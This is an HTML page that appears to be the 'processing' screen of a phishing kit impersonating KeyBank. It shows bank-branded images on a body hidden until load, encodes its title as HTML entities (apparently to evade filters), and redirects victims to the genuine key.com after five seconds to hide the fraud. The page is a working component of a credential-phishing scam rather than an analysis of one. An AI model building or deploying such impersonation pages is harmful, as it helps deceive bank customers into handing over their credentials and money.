<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#75;&#101;&#121;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<html><meta http-equiv="Refresh" content="05; url=https://www.key.com/personal/index.jsp?key=com"></html>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:72px; z-index:0"><img src="images/kn17.png" alt="" title="" border=0 width=1365 height=72></div>

<div id="image2" style="position:absolute; overflow:hidden; left:160px; top:98px; width:259px; height:49px; z-index:1"><img src="images/kn18.png" alt="" title="" border=0 width=259 height=49></div>

<div id="image3" style="position:absolute; overflow:hidden; left:542px; top:271px; width:128px; height:128px; z-index:2"><img src="images/key.gif" alt="" title="" border=0 width=128 height=128></div>


</body>
</html>
